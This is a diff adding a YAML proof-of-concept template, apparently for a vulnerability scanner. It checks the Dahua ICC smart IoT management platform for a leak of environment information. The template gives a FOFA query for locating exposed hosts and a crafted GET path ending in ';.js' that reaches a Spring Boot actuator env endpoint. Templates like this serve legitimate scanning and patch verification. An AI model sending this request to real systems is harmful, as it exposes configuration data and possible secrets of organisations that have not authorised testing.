@@ -1,0 +1,22 @@
+id: poc-yaml-dahua-icc-env-sensitive-information-leakage
+info:
+  name: 大华ICC智能物联综合管理平台 env 敏感信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 大华ICC智能物联综合管理平台
+  fofa: body="*客户端会小于800*" && port="8443"
+requests:
+- method: GET
+  path: /evo-apigw/dsc-mac/env;.js
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"user.name\":") &&
+
+    contains(body,"\"os.name\":") &&
+
+    contains(headers,"application/vnd.spring-boot.actuator.v1+json")
+
+    '
+variables: {}
+transport: http
